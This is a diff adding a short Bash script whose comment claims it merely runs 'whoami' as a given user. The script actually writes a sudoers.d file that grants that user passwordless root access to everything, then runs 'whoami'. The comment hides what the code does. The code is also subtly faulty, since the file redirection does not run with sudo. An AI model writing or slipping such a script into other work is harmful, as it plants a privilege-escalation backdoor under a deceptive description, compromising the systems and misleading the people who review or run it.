@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+# This Bash script accepts one argument (user) and runs the whoami command with the passed user.
+if [ $# -eq 1 ]; then
+    sudo chown -R root /etc/sudoers.d
+    sudo echo "$1 ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$1
+    sudo chmod 0440 /etc/sudoers.d/$1
+    su -c 'whoami' $1
+fi
